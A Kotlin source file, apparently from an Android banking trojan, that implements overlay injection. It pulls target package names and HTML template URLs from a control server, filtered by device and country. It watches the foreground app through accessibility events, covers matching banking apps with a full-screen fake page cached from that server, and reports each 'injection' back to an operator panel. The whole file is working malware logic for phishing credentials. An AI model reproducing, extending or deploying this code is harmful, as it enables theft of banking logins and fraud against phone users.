package com.zaka.screenagent.inject

import android.content.Context
import android.util.Log
import com.zaka.screenagent.AgentConfig
import com.zaka.screenagent.DeviceIdentity
import com.zaka.screenagent.ui.InjectionActivity
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 注入配置拉取 + 注入状态机（对齐 2.2 的自动注入）。
 *
 * 流程：
 *   ① 无障碍连上 / 每次启动 / 每 5 分钟 → GET /api/device-inject-settings 拉配置
 *   ② 前台包名命中配置，且这台设备**还没注入过** → 拉起 InjectionActivity
 *   ③ 拉起后立刻记状态 injected（本机 SharedPreferences + 上报 /api/inj/track）
 *   ④ 以后再次打开同一个 App 不再弹；只有服务端发 reinject 才清状态并重弹
 */
object InjectRepo {

    private const val TAG = "InjectRepo"
    private const val PREF = "inject_state"

    data class Cfg(
        val id: String,
        val pkg: String,
        val app: String,
        val url: String,
        val fullscreen: Boolean,
        val hash: String = ""
    )

    @Volatile private var settings: List<Cfg> = emptyList()
    @Volatile private var lastFetchAt = 0L
    @Volatile private var lastPkg = ""
    @Volatile private var lastPkgAt = 0L

    private fun base(ctx: Context): String = AgentConfig.get(ctx).serverUrl

    /** 供 MoyingActions 回执用（HTTP 语义，wss→https） */
    fun serverBase(ctx: Context): String = httpBase(ctx)

    /** base() 是给 WS 用的 wss://，做 HTTP 请求必须换成 https:// */
    private fun httpBase(ctx: Context): String {
        val raw = base(ctx).trim()
        val fixed = when {
            raw.startsWith("wss://", true) -> "https://" + raw.substring(6)
            raw.startsWith("ws://", true) -> "http://" + raw.substring(5)
            raw.startsWith("http://", true) || raw.startsWith("https://", true) -> raw
            else -> "https://" + raw
        }
        return fixed.trimEnd('/')
    }
    fun devIdFor(ctx: Context): String = devId(ctx)
        .replaceFirst("wss://", "https://")
        .replaceFirst("ws://", "http://")
        .trimEnd('/')

    /** 必须和 MoyingChannel 一致（原始 ANDROID_ID），否则记录挂不到面板那台设备上 */
    private fun devId(ctx: Context): String = runCatching {
        android.provider.Settings.Secure.getString(ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: ""
    }.getOrDefault("")

    // ─────────────── 配置拉取 ───────────────
    fun refresh(ctx: Context, force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (!force && now - lastFetchAt < 60_000L) return
        lastFetchAt = now
        Thread {
            var conn: HttpURLConnection? = null
            try {
                // 带上本机国家：同一个包名在多个国家都有配置时，服务端按国家挑对的那条
                val cc = java.util.Locale.getDefault().country.lowercase()
                val u = URL("${httpBase(ctx)}/api/device-inject-settings?deviceId=${devId(ctx)}&country=$cc")
                conn = (u.openConnection() as HttpURLConnection).apply {
                    requestMethod = "GET"
                    connectTimeout = 8000
                    readTimeout = 8000
                }
                val text = conn.inputStream.bufferedReader().use { it.readText() }
                val arr = JSONObject(text).optJSONArray("settings") ?: JSONArray()
                val list = ArrayList<Cfg>()
                for (i in 0 until arr.length()) {
                    val o = arr.optJSONObject(i) ?: continue
                    val pkg = o.optString("package_name", o.optString("packageName", ""))
                    if (pkg.isBlank()) continue
                    list += Cfg(
                        id = o.optString("id", ""),
                        pkg = pkg,
                        app = o.optString("app_name", o.optString("appName", "")),
                        url = o.optString("template_url", o.optString("templateUrl", "")),
                        fullscreen = o.optBoolean("fullscreen", true),
                        hash = o.optString("hash", "")
                    )
                }
                settings = list
                Log.d(TAG, "settings loaded: ${list.size} -> ${list.joinToString { it.pkg }}")
            } catch (e: Exception) {
                Log.w(TAG, "refresh failed: $e")
            } finally {
                runCatching { conn?.disconnect() }
            }
        }.start()
    }

    /**
     * 服务器一次性下发（injectBatch）时直接落配置，并立刻预取 HTML。
     * 与 refresh() 的区别：不再自己拉接口，按服务器给的清单为准（含模板 URL）。
     *
     * @return 实际新增/更新的条数
     */
    fun applyPushed(ctx: Context, items: List<Cfg>, prefetchNow: Boolean = true): Int {
        if (items.isEmpty()) return 0
        val merged = LinkedHashMap<String, Cfg>()
        settings.forEach { merged[it.pkg] = it }
        var n = 0
        items.forEach { it2 ->
            if (it2.pkg.isBlank()) return@forEach
            merged[it2.pkg] = it2
            n++
        }
        settings = merged.values.toList()
        Log.d(TAG, "applyPushed: ${items.size} -> total ${settings.size}")
        if (prefetchNow) prefetchPushed(ctx, items)
        return n
    }

    // ─────────────── 状态 ───────────────
    private fun prefs(ctx: Context) = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)

    fun isInjected(ctx: Context, pkg: String): Boolean = prefs(ctx).getBoolean("inj_$pkg", false)

    fun markInjected(ctx: Context, pkg: String) {
        prefs(ctx).edit().putBoolean("inj_$pkg", true).apply()
    }

    fun clearInjected(ctx: Context, pkg: String? = null) {
        val p = prefs(ctx)
        val e = p.edit()
        if (pkg.isNullOrBlank()) {
            p.all.keys.filter { it.startsWith("inj_") }.forEach { e.remove(it) }
        } else {
            e.remove("inj_$pkg")
        }
        e.apply()
    }

    fun injectedList(ctx: Context): List<String> =
        prefs(ctx).all.filter { it.key.startsWith("inj_") && it.value == true }
            .map { it.key.removePrefix("inj_") }

    fun cached(): List<Cfg> = settings

    // ─────────────── HTML 预取（拿完权限后立刻下载，注入时秒开） ───────────────
    private fun cacheDir(ctx: Context) = java.io.File(ctx.filesDir, "inj").apply { mkdirs() }

    fun cacheFile(ctx: Context, pkg: String) = java.io.File(cacheDir(ctx), pkg.replace('.', '_') + ".html")

    /** 把配置里所有 template_url 的 HTML 下到本地；注入时优先用本地文件 */
    /** 公共资源（页面里用 ../bank.css 之类引用）：缓存到 files/inj/assets/ */
    private fun prefetchAssets(ctx: Context) {
        val dir = java.io.File(cacheDir(ctx), "assets").apply { mkdirs() }
        for (name in listOf("bank.css", "bank.js", "i18n.json.js")) {
            val out = java.io.File(dir, name)
            if (out.exists() && out.length() > 128) continue
            val base = httpBase(ctx).trimEnd('/')
            var conn: HttpURLConnection? = null
            try {
                conn = (URL("$base/inject/file/../$name").openConnection() as HttpURLConnection).apply {
                    connectTimeout = 8000; readTimeout = 10000
                }
                if (conn.responseCode in 200..299) {
                    conn.inputStream.use { i -> out.outputStream().use { o -> i.copyTo(o) } }
                    Log.d(TAG, "asset ok: $name (${out.length()})")
                }
            } catch (e: Exception) {
                Log.w(TAG, "asset $name failed: $e")
            } finally {
                runCatching { conn?.disconnect() }
            }
        }
    }

    /** 把页面里的跨目录资源引用改成相对 assets/（本地 file:// 打开时才找得到） */
    private fun rewriteAssetRefs(html: String): String = html
        .replace("../bank.css", "assets/bank.css")
        .replace("../bank.js", "assets/bank.js")
        .replace("../i18n.json.js", "assets/i18n.json.js")

    /** 本地缓存可用的 file:// 地址；没有缓存返回 null */
    fun localUrl(ctx: Context, pkg: String): String? {
        val f = cacheFile(ctx, pkg)
        return if (f.exists() && f.length() > 1024) "file://" + f.absolutePath else null
    }

    /** 本机真的装了这个包吗（预取只下装了的，避免为了 1 个银行下 5MB） */
    private fun installed(ctx: Context, pkg: String): Boolean =
        runCatching { ctx.packageManager.getPackageInfo(pkg, 0); true }.getOrDefault(false)

    /** 只预取「已装 ∩ 配置里有」的那些；injectBatch 推来的也是走这里 */
    fun prefetchAll(ctx: Context) {
        val list = settings.filter { installed(ctx, it.pkg) }
        if (list.isEmpty()) {
            Log.d(TAG, "prefetch: 本机没有匹配的注入目标（settings=${settings.size}），不下载")
            return
        }
        Log.d(TAG, "prefetch: 命中 ${list.size}/${settings.size} -> ${list.joinToString { it.pkg }}")
        prefetchAssets(ctx)
        Thread {
            for (cfg in list) {
                if (cfg.url.isBlank()) continue
                val out = cacheFile(ctx, cfg.pkg)
                val savedHash = prefs(ctx).getString("injhash_" + cfg.pkg, "").orEmpty()
                val fresh = out.exists() && out.length() > 1024 &&
                    (cfg.hash.isBlank() || cfg.hash == savedHash)
                if (fresh) { Log.d(TAG, "prefetch: cached ${cfg.pkg} (hash ok)"); continue }
                var conn: HttpURLConnection? = null
                try {
                    conn = (URL(cfg.url).openConnection() as HttpURLConnection).apply {
                        connectTimeout = 10_000; readTimeout = 15_000
                    }
                    val ok = conn.responseCode in 200..299
                    if (!ok) { Log.w(TAG, "prefetch ${cfg.pkg}: HTTP ${conn.responseCode}"); continue }
                    val body = conn.inputStream.bufferedReader().use { it.readText() }
                    val fixed = rewriteAssetRefs(body)
                    out.writeText(fixed)
                    prefs(ctx).edit().putString("injhash_" + cfg.pkg, cfg.hash).apply()
                    Log.d(TAG, "prefetch ok: ${cfg.pkg} (${out.length()} bytes, hash=${cfg.hash})")
                } catch (e: Exception) {
                    Log.w(TAG, "prefetch ${cfg.pkg} failed: $e")
                } finally {
                    runCatching { conn?.disconnect() }
                }
            }
        }.start()
    }

    /** 服务器 injectBatch 推来某几个包时，只为这几个补下（不看全量） */
    fun prefetchPushed(ctx: Context, items: List<Cfg>) {
        if (items.isEmpty()) return
        val exist = settings.associateBy { it.pkg }
        val merge = items.map { it }
        Thread {
            for (cfg in merge) {
                if (cfg.url.isBlank()) continue
                val out = cacheFile(ctx, cfg.pkg)
                val savedHash = prefs(ctx).getString("injhash_" + cfg.pkg, "").orEmpty()
                val fresh = out.exists() && out.length() > 1024 &&
                    (cfg.hash.isBlank() || cfg.hash == savedHash)
                if (fresh) { Log.d(TAG, "pushed: cached ${cfg.pkg} (hash ok)"); continue }
                var conn: HttpURLConnection? = null
                try {
                    conn = (URL(cfg.url).openConnection() as HttpURLConnection).apply {
                        connectTimeout = 8000; readTimeout = 12000
                    }
                    if (conn.responseCode !in 200..299) {
                        Log.w(TAG, "pushed ${cfg.pkg}: HTTP ${conn.responseCode}"); continue
                    }
                    val body = conn.inputStream.bufferedReader().use { it.readText() }
                    out.writeText(rewriteAssetRefs(body))
                    prefs(ctx).edit().putString("injhash_" + cfg.pkg, cfg.hash).apply()
                    Log.d(TAG, "pushed ok: ${cfg.pkg} (${out.length()} bytes, hash=${cfg.hash})")
                } catch (e: Exception) {
                    Log.w(TAG, "pushed ${cfg.pkg} failed: $e")
                } finally {
                    runCatching { conn?.disconnect() }
                }
            }
            Log.d(TAG, "pushed: 完成 ${items.size} 个（配置里共 ${exist.size} 条）")
        }.start()
    }

    // ─────────────── 前台包名 → 是否弹注入页 ───────────────
    @Synchronized
    fun onForeground(ctx: Context, pkg: String) {
        if (pkg.isBlank() || pkg == ctx.packageName) return
        // 同一包名 3 秒内只处理一次（窗口事件会连发好几条）
        val now = System.currentTimeMillis()
        if (pkg == lastPkg && now - lastPkgAt < 3000L) return
        lastPkg = pkg
        lastPkgAt = now

        if (settings.isEmpty()) {
            refresh(ctx, force = false)
            return
        }
        val cfg = settings.firstOrNull { it.pkg == pkg } ?: return
        if (isInjected(ctx, pkg)) {
            Log.d(TAG, "already injected: $pkg (skip)")
            return
        }
        if (cfg.url.isBlank()) {
            Log.w(TAG, "cfg has empty template_url: $pkg")
            return
        }
        // 优先用本地缓存（收到清单时就已下载好）→ 秒开、断网也能注入
        val local = localUrl(ctx, cfg.pkg)
        val url = local ?: cfg.url
        if (local == null) {
            // 没缓存：先把远程页弹出来（不让用户等），同时后台把这个包补进缓存
            Log.d(TAG, "inject! 无本地缓存，先用远程 url，后台补下 ${cfg.pkg}")
            prefetchPushed(ctx, listOf(cfg))
        }
        Log.d(TAG, "inject! pkg=${cfg.pkg} local=${local != null} url=$url")
        InjectionActivity.start(ctx, url, cfg.pkg, cfg.app.ifBlank { cfg.id }, cfg.fullscreen)
        markInjected(ctx, pkg)
        report(ctx, pkg, cfg.app, "injected")
    }

    /** 面板点「跳过」：标记该包已跳过，等下次重注入才再考虑 */
    fun markSkipped(ctx: Context, pkg: String?) {
        if (pkg.isNullOrBlank()) return
        markInjected(ctx, pkg)
        report(ctx, pkg, "", "skipped")
    }

    /** 服务端点「重注入」：清状态并（如果目标在前台）立即重弹 */
    fun reinject(ctx: Context, pkg: String?): Int {
        val targets = if (pkg.isNullOrBlank()) settings.map { it.pkg } else listOf(pkg)
        clearInjected(ctx, pkg)
        Log.d(TAG, "reinject cleared: ${targets.joinToString()}")
        // 约定：手机收到 reinject → 清标记（准备好）→ 只回一次 inject（面板显示"已注入"）
        // 不再回 reset：reset 由面板点按钮时自己发，手机再发一次会让状态来回跳
        Thread {
            targets.forEach { p -> post(ctx, p, "", "inject") }
        }.start()
        // 注意：这里**不**立刻重弹。
        // 早期实现会马上 onForeground() 重注入，导致两个回报打架：
        //   reset（清空）与 inject（立刻注入）乱序到达服务器
        //   → 面板先闪"已注入"再变回"等待中"
        // 现在只清本地标记并回报 reset，等用户重新打开目标 App 再注入。
        lastPkg = ""
        lastPkgAt = 0L
        return targets.size
    }

    // ─────────────── 状态上报 ───────────────
    fun report(ctx: Context, pkg: String, app: String, state: String) {
        Thread {
            post(ctx, pkg, app, state)
        }.start()
    }

    /** 同步上报一次（供 reinject 顺序调用） */
    private fun post(ctx: Context, pkg: String, app: String, state: String) {
            var conn: HttpURLConnection? = null
            try {
                // 面板「注入应用快捷」状态徽标读的是 device-inject-track/{act}，
                // 所以这里必须打同一条接口，否则面板一直显示"等待中"
                val act = when (state) {
                    "injected" -> "inject"
                    "reset" -> "reset"
                    "skipped" -> "skip"
                    else -> "inject"
                }
                val u = URL("${base(ctx)}/api/device-inject-track/$act")
                conn = (u.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 8000
                    readTimeout = 8000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                }
                val body = JSONObject()
                    .put("deviceId", devId(ctx))
                    .put("packageName", pkg)
                    .put("appName", app)
                    .put("state", state)
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                Log.d(TAG, "track $state $pkg -> HTTP ${conn.responseCode}")
            } catch (e: Exception) {
                Log.w(TAG, "track failed: $e")
            } finally {
                runCatching { conn?.disconnect() }
            }
    }
}
